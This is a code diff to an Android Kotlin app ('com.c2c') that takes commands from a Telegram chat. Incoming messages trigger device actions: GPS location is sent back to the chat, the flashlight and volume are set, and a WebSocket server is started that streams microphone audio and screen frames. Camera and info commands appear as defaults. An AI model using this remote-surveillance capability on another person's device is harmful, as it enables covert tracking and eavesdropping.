@@ -1,3 +1,4 @@
+--- START OF FILE app/src/main/java/com/c2c/MainActivity.kt ---
 package com.c2c
 
 import android.Manifest
@@ -17,16 +18,13 @@ import android.media.AudioFormat
 import android.media.AudioManager
 import android.media.AudioRecord
 import android.media.MediaRecorder
-import android.net.Uri
 import android.os.BatteryManager
 import android.os.Build
 import android.os.Bundle
 import android.os.Environment
 import android.os.IBinder
-import android.provider.Settings
 import android.widget.Toast
 import androidx.activity.ComponentActivity
-import androidx.activity.compose.rememberLauncherForActivityResult
 import androidx.activity.compose.setContent
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.biometric.BiometricManager
@@ -64,14 +62,12 @@ import androidx.compose.ui.graphics.asImageBitmap
 import androidx.compose.ui.graphics.vector.ImageVector
 import androidx.compose.ui.input.pointer.pointerInput
 import androidx.compose.ui.layout.ContentScale
-import androidx.compose.ui.platform.LocalClipboardManager
 import androidx.compose.ui.platform.LocalContext
 import androidx.compose.ui.text.AnnotatedString
 import androidx.compose.ui.text.SpanStyle
 import androidx.compose.ui.text.buildAnnotatedString
 import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.text.input.OffsetMapping
-import androidx.compose.ui.text.input.PasswordVisualTransformation
 import androidx.compose.ui.text.input.TransformedText
 import androidx.compose.ui.text.input.VisualTransformation
 import androidx.compose.ui.text.style.TextAlign
@@ -91,16 +87,21 @@ import androidx.navigation.compose.*
 import com.c2c.ui.theme.*
 import io.ktor.client.HttpClient
 import io.ktor.client.engine.cio.CIO
+import io.ktor.client.request.get
 import io.ktor.client.request.post
 import io.ktor.client.request.setBody
+import io.ktor.client.statement.bodyAsText
 import io.ktor.server.application.*
 import io.ktor.server.engine.ApplicationEngine
 import io.ktor.server.engine.embeddedServer
 import io.ktor.server.routing.routing
 import io.ktor.server.websocket.*
 import io.ktor.websocket.*
+import kotlinx.coroutines.CancellationException
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.Job
 import kotlinx.coroutines.channels.Channel
+import kotlinx.coroutines.delay
 import kotlinx.coroutines.flow.MutableSharedFlow
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.isActive
@@ -125,6 +126,7 @@ object ServerCore {
     val liveSessions = CopyOnWriteArrayList<WebSocketServerSession>()
     val logsFlow = MutableSharedFlow<String>(replay = 50)
     val streamFlow = MutableSharedFlow<ByteArray>(replay = 5)
+    
     val isRunningFlow = MutableStateFlow(false)
     var isRunning: Boolean get() = isRunningFlow.value; set(value) { isRunningFlow.value = value }
     var lastStatusSlab = "System Ready. Waiting for link..."
@@ -182,27 +184,30 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
     var serverLogs = mutableStateListOf<String>()
     var latestSlabTxt by mutableStateOf(ServerCore.lastStatusSlab)
     
-    // Hardware
+    // Persistent Local Chat Engine
+    var tgMessages = mutableStateListOf<TgMessage>()
+    var tgChatName by mutableStateOf("Target Node")
+    var tgChatId by mutableStateOf(0L)
+    
     var isMicRunning by mutableStateOf(false)
     private val audioChannel = Channel<ByteArray>(Channel.UNLIMITED)
     var liveScreenFrame by mutableStateOf<ByteArray?>(null)
+
+    val httpClient = HttpClient(CIO) { engine { requestTimeout = 65_000 } }
+    
+    // Hardware Managers
     private val cameraManager = application.getSystemService(Context.CAMERA_SERVICE) as CameraManager
     private val audioManager = application.getSystemService(Context.AUDIO_SERVICE) as AudioManager
     private val locationManager = application.getSystemService(Context.LOCATION_SERVICE) as LocationManager
 
-    // HTTP Push
-    val httpClient = HttpClient(CIO) { engine { requestTimeout = 65_000 } }
-
     // TDLib State
     var tdClient: Client? = null
     var tdAuthState by mutableStateOf(TdAuthState.CLOSED)
-    var tgMessages = mutableStateListOf<TgMessage>()
-    var tgChatName by mutableStateOf("Target Node")
-    var tgChatId by mutableStateOf(0L)
     var isTdLibEngineRunning by mutableStateOf(false)
 
     init {
         loadConfigFromJson()
+        loadLocalChatHistory()
         viewModelScope.launch(Dispatchers.Main) { ServerCore.logsFlow.collect { log -> if (serverLogs.size > 150) serverLogs.removeAt(0); serverLogs.add(log); latestSlabTxt = ServerCore.lastStatusSlab } }
         viewModelScope.launch(Dispatchers.IO) { ServerCore.streamFlow.collect { bytes -> if (bytes.firstOrNull()?.toInt() == 0x03) liveScreenFrame = bytes.copyOfRange(1, bytes.size) } }
         viewModelScope.launch(Dispatchers.IO) { for (chunk in audioChannel) { ServerCore.liveSessions.forEach { try { it.send(Frame.Binary(true, chunk)) } catch (e: Exception) {} } } }
@@ -217,8 +222,13 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
             isTdLibEngineRunning = true
             tdAuthState = TdAuthState.INIT
             tgMessages.clear()
-            Client.execute(TdApi.SetLogVerbosityLevel(0))
-            tdClient = Client.create({ update -> handleTdUpdate(update) }, { _, _ -> }, { _ -> })
+            
+            // FIXED: Using .apply for robust constructor
+            val verbosity = TdApi.SetLogVerbosityLevel().apply { newVerbosityLevel = 0 }
+            Client.execute(verbosity)
+            
+            // FIXED: 1-argument Exception Handlers matched
+            tdClient = Client.create({ update -> handleTdUpdate(update) }, { _ -> }, { _ -> })
         }
     }
 
@@ -259,6 +269,7 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
                         if (content is TdApi.MessageText) {
                             tgMessages.add(TgMessage(msg.id, content.text.text, msg.isOutgoing, msg.date * 1000L))
                             tgMessages.sortBy { it.timestamp }
+                            saveLocalChatHistory()
                             if (!msg.isOutgoing) executeHardwareCommand(content.text.text)
                         }
                     }
@@ -267,13 +278,20 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
         }
     }
 
-    fun tdSendPhone(phone: String) = tdClient?.send(TdApi.SetAuthenticationPhoneNumber(phone, null)) { }
-    fun tdSendCode(code: String) = tdClient?.send(TdApi.CheckAuthenticationCode(code)) { }
-    fun tdSendPassword(pass: String) = tdClient?.send(TdApi.CheckAuthenticationPassword(pass)) { }
+    // FIXED: Using .apply for all parameters to survive API changes
+    fun tdSendPhone(phone: String) = tdClient?.send(TdApi.SetAuthenticationPhoneNumber().apply { phoneNumber = phone }) { }
+    fun tdSendCode(code: String) = tdClient?.send(TdApi.CheckAuthenticationCode().apply { this.code = code }) { }
+    fun tdSendPassword(pass: String) = tdClient?.send(TdApi.CheckAuthenticationPassword().apply { password = pass }) { }
 
     private fun fetchChatHistory() {
-        tdClient?.send(TdApi.GetChat(tgChatId)) { chat -> if (chat is TdApi.Chat) viewModelScope.launch(Dispatchers.Main) { tgChatName = chat.title } }
-        tdClient?.send(TdApi.GetChatHistory(tgChatId, 0, 0, 50, false)) { res ->
+        val chatReq = TdApi.GetChat().apply { chatId = tgChatId }
+        tdClient?.send(chatReq) { chat -> if (chat is TdApi.Chat) viewModelScope.launch(Dispatchers.Main) { tgChatName = chat.title } }
+        
+        val historyReq = TdApi.GetChatHistory().apply {
+            chatId = tgChatId
+            limit = 50
+        }
+        tdClient?.send(historyReq) { res ->
             if (res is TdApi.Messages) {
                 viewModelScope.launch(Dispatchers.Main) {
                     val newMsgs = res.messages.filter { it.content is TdApi.MessageText }.map { msg ->
@@ -281,17 +299,60 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
                     }
                     tgMessages.clear()
                     tgMessages.addAll(newMsgs.reversed())
+                    saveLocalChatHistory()
                 }
             }
         }
     }
 
-    fun sendTelegramMessage(text: String) {
+    fun sendTelegramMessage(text: String, isMe: Boolean = true) {
         if (tgChatId == 0L || tdClient == null) return
-        val content = TdApi.InputMessageText(TdApi.FormattedText(text, emptyArray()), false, false)
-        tdClient?.send(TdApi.SendMessage(tgChatId, 0, 0, null, null, content)) { }
+        
+        // Add to Local UI instantly
+        viewModelScope.launch(Dispatchers.Main) {
+            tgMessages.add(TgMessage(System.currentTimeMillis(), text, isMe, System.currentTimeMillis()))
+            saveLocalChatHistory()
+        }
+
+        // FIXED: Using .apply for nested message contents
+        if (isMe) {
+            viewModelScope.launch(Dispatchers.IO) {
+                val formattedText = TdApi.FormattedText().apply {
+                    this.text = text
+                    this.entities = emptyArray()
+                }
+                val inputContent = TdApi.InputMessageText().apply {
+                    this.text = formattedText
+                }
+                val request = TdApi.SendMessage().apply {
+                    this.chatId = tgChatId
+                    this.inputMessageContent = inputContent
+                }
+                tdClient?.send(request) { }
+            }
+        }
     }
 
+    // --- Persistent Chat Methods ---
+    private fun loadLocalChatHistory() {
+        val historyStr = prefs.getString("tg_history", "[]")
+        try {
+            val arr = JSONArray(historyStr)
+            tgMessages.clear()
+            for (i in 0 until arr.length()) {
+                val obj = arr.getJSONObject(i)
+                tgMessages.add(TgMessage(obj.getLong("id"), obj.getString("text"), obj.getBoolean("isMe"), obj.getLong("timestamp")))
+            }
+        } catch (e: Exception) {}
+    }
+
+    private fun saveLocalChatHistory() {
+        val arr = JSONArray()
+        tgMessages.forEach { msg -> arr.put(JSONObject().put("id", msg.id).put("text", msg.text).put("isMe", msg.isMe).put("timestamp", msg.timestamp)) }
+        prefs.edit().putString("tg_history", arr.toString()).apply()
+    }
+
+    // --- Hardware Command Parser ---
     @SuppressLint("MissingPermission")
     private fun executeHardwareCommand(cmdString: String) {
         val parts = cmdString.split(" ")
@@ -300,20 +361,23 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
         viewModelScope.launch(Dispatchers.IO) {
             when (cmd) {
                 "ping" -> {
-                    val bat = appCtx.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
-                    sendTelegramMessage("🟢 Node Online.\n🔋 Battery: $bat%")
+                    val batteryStatus = appCtx.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
+                    val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
+                    sendTelegramMessage("🟢 Node Online.\n🔋 Battery: $level%")
                 }
                 "loc" -> {
-                    sendTelegramMessage("🛰️ Fetching GPS...")
+                    sendTelegramMessage("🛰️ Fetching GPS Coordinates...")
                     try {
                         val loc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
-                        if (loc != null) sendTelegramMessage("📍 <b>Location Acquired:</b>\nLat: ${loc.latitude}\nLng: ${loc.longitude}") else sendTelegramMessage("❌ Location unavailable.")
-                    } catch (e: Exception) { sendTelegramMessage("❌ GPS Error") }
+                        if (loc != null) sendTelegramMessage("📍 <b>Location Acquired:</b>\nLat: ${loc.latitude}\nLng: ${loc.longitude}\nAccuracy: ${loc.accuracy}m")
+                        else sendTelegramMessage("❌ Location unavailable.")
+                    } catch (e: Exception) { sendTelegramMessage("❌ GPS Error: ${e.message}") }
                 }
                 "flash" -> {
                     try {
+                        val camId = cameraManager.cameraIdList[0]
                         val state = arg.lowercase() == "on"
-                        cameraManager.setTorchMode(cameraManager.cameraIdList[0], state)
+                        cameraManager.setTorchMode(camId, state)
                         sendTelegramMessage(if (state) "🔦 Flashlight Enabled" else "🔦 Flashlight Disabled")
                     } catch (e: Exception) { sendTelegramMessage("❌ Camera Hardware Error.") }
                 }
@@ -321,15 +385,22 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
                     val targetVol = arg.toIntOrNull() ?: 50
                     val max = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
                     audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, (targetVol * max) / 100, 0)
-                    sendTelegramMessage("🔊 Volume set to $targetVol%")
+                    sendTelegramMessage("🔊 Media volume set to $targetVol%")
                 }
-                "live_start" -> { sendTelegramMessage("⚡ Initiating Live WebSocket..."); toggleServer(appCtx) }
-                "live_stop" -> { ServerCore.ktorServer?.stop(1000, 2000); ServerCore.isRunning = false; sendTelegramMessage("🛑 Core Node Terminated.") }
+                "live_start" -> {
+                    sendTelegramMessage("⚡ Initiating Live WebSocket Connection...")
+                    toggleServer(appCtx)
+                }
+                "live_stop" -> {
+                    ServerCore.ktorServer?.stop(1000, 2000)
+                    ServerCore.isRunning = false
+                    sendTelegramMessage("🛑 Core Node Terminated.")
+                }
             }
         }
     }
 
-    // --- JSON Engine ---
+    // --- Standard JSON & Ktor Configs below ---
     fun exportConfigToJson(): String {
         val root = JSONObject()
         root.put("network", JSONObject().put("ntfyUrl", prefs.getString("ntfyUrl", "https://ntfy.sh")).put("ntfyTopic", prefs.getString("ntfyTopic", "default_topic")))
@@ -360,6 +431,7 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
     private fun loadConfigFromJson() {
         topPanelCommands.clear(); pushMessages.clear()
         val rawTp = prefs.getString("raw_top_panel", null); val rawCmds = prefs.getString("raw_commands", null)
+        
         if (rawTp != null && rawCmds != null) {
             try {
                 val tpArr = JSONArray(rawTp); for (i in 0 until tpArr.length()) { topPanelCommands.add(jsonToCmd(tpArr.getJSONObject(i))) }
@@ -370,6 +442,7 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
             topPanelCommands.add(PushMessage(2, "Ping Node", "ping", "", "radar"))
             topPanelCommands.add(PushMessage(3, "Location", "loc", "", "location_on"))
             topPanelCommands.add(PushMessage(4, "Volume", "vol", "100", "volume_up", true, "Mute", "vol", "0"))
+            
             pushMessages.add(PushMessage(10, "Wake/Live Node", "live_start", "ws://0.0.0.0:8765/live", "router"))
             pushMessages.add(PushMessage(11, "Kill Node", "live_stop", "", "power_settings_new"))
             pushMessages.add(PushMessage(12, "Cam Front", "cam_front", "", "camera_front"))
@@ -378,6 +451,7 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
             pushMessages.add(PushMessage(15, "Full Info", "info", "", "info"))
             pushMessages.add(PushMessage(16, "Fetch Logs", "get_log", "", "description"))
             pushMessages.add(PushMessage(17, "Clear Logs", "clear_log", "", "delete_sweep"))
+            
             exportConfigToJson().let { importConfigFromJson(it) }
         }
     }
